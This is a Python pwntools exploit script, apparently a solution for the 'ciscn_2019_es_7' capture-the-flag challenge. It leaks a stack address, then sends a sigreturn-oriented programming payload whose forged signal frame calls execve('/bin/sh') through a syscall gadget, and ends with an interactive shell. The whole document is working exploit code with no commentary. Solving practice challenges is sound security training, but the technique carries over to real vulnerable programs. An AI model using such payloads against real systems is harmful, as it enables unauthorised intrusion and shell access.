from pwn import*
context.log_level = 'debug'
context(os='linux',arch='amd64')

sh = process('./ciscn_2019_es_7')

payload = '/bin/sh\x00'.ljust(0x10,'A')
payload += p64(0x000040051D) #jmp to start
payload += 'A'*6 + ':'
#pause()
sh.sendline(payload)
sh.recvuntil('AAA:\n')
stack_addr = u64(sh.recv(6).ljust(8,'\x00')) - 0x1ff58
print hex(stack_addr)
bin_sh_addr = stack_addr + 0x1fe20

pop_rdi_ret = 0x00000000004005a3
pop_rsi_r15_ret = 0x00000000004005a1
mov_rax_3bh = 0x04004E2
ret = 0x00000000004003a9
syscall = 0x0000000000400501
mov_rax_ret = 0x00000000004004da

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve #59
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall

payload = '/bin/sh\x00'.ljust(0x10,'A')
payload += p64(mov_rax_ret)
payload += p64(syscall)
payload += str(sigframe)
log.info("payload===>\n"+str(payload))
#gdb.attach(sh,'b*0x04004ED')
pause()
sh.sendline(payload)

sh.interactive()
